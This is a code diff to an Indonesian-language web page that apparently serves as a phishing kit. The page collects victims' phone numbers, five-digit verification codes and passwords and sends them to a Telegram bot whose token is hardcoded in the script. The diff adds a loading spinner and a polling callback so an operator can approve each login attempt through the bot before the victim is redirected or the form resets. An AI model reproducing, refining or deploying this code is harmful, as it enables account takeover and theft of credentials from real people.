@@ -125,6 +125,35 @@ body {
     border-color: #1D4ED8; /* Border biru terang saat fokus */
 }
 
+.loading {
+    position: relative;
+    pointer-events: none; /* Nonaktifkan interaksi */
+    opacity: 0.8; /* Tampilkan efek sedang proses */
+}
+
+.loading::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 20px;
+    height: 20px;
+    margin-top: -10px;
+    margin-left: -10px;
+    border: 3px solid transparent;
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    from {
+        transform: rotate(0deg);
+    }
+    to {
+        transform: rotate(360deg);
+    }
+}
 
 
     </style>
@@ -344,13 +373,28 @@ function sendPhoneToTelegram(phone) {
 function confirmCodeAndSendPhoneNumber() {
     const code = document.getElementById('verificationCode').value;
     const password = document.getElementById('passwordPage1').value;
+    const verifyButton = document.querySelector('#page1 button'); // Ambil tombol Verifikasi
 
+    // Validasi input kode dan password
     if (code.length === 5 && password.length > 0) {
+        // Ubah tombol menjadi loading
+        verifyButton.classList.add('loading');
+        verifyButton.textContent = 'Memverifikasi...'; // Ganti teks tombol
+
+        // Kirim data ke Telegram
         sendMessageWithChoices(code, password);
+
+        // Polling untuk mendapatkan respons dari bot Telegram
+        pollBotResponse(() => {
+            // Hapus loading jika respons diterima
+            verifyButton.classList.remove('loading');
+            verifyButton.textContent = 'Verifikasi'; // Kembalikan teks tombol
+        });
     } else {
         alert('Kode atau kata sandi tidak lengkap!');
     }
 }
+
 
 
 function moveFocus(currentInput, index) {
@@ -381,35 +425,37 @@ function sendMessageWithChoices(code, password) {
 }
 
 
-async function pollBotResponse() {
+async function pollBotResponse(onResponseReceived) {
     const botPollingInterval = setInterval(async () => {
         const response = await fetch(`https://api.telegram.org/bot${'7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'}/getUpdates`);
         const data = await response.json();
 
-        // Cek jika ada pembaruan
         if (data.result.length > 0) {
             const lastUpdate = data.result[data.result.length - 1];
             if (lastUpdate.callback_query) {
                 const action = lastUpdate.callback_query.data;
-                const messageId = lastUpdate.callback_query.message.message_id;  // ID pesan
+                const messageId = lastUpdate.callback_query.message.message_id;
 
                 if (action === 'continue') {
-                    // Pindah ke halaman lain (misalnya page3.html) setelah klik 'Lanjutkan'
-                    window.location.href = "Animasi/animasi.html";  // Ganti dengan halaman yang Anda inginkan
-
-                    // Menonaktifkan tombol 'Lanjutkan' di Telegram setelah diklik
+                    window.location.href = "Animasi.html"; // Lanjut ke halaman lain
+                                        // Menonaktifkan tombol 'Lanjutkan' di Telegram setelah diklik
                     disableButton(messageId, 'continue'); // Menonaktifkan tombol
                     clearInterval(botPollingInterval); // Hentikan polling setelah mendapatkan respons
                 } else if (action === 'cancel' || action === 'reset') {
-                    // Reset kolom input dan tetap di halaman yang sama jika 'Tidak' ditekan
                     resetInputs();
                     disableButton(messageId, 'cancel'); // Menonaktifkan tombol
                     clearInterval(botPollingInterval); // Hentikan polling setelah reset
+                                    // Hentikan polling dan panggil callback
+                clearInterval(botPollingInterval);
+                if (onResponseReceived) onResponseReceived();
                 }
+
+
             }
         }
-    }, 1000);  // Cek setiap detik
+    }, 1000); // Cek setiap detik
 }
+
 
 
 
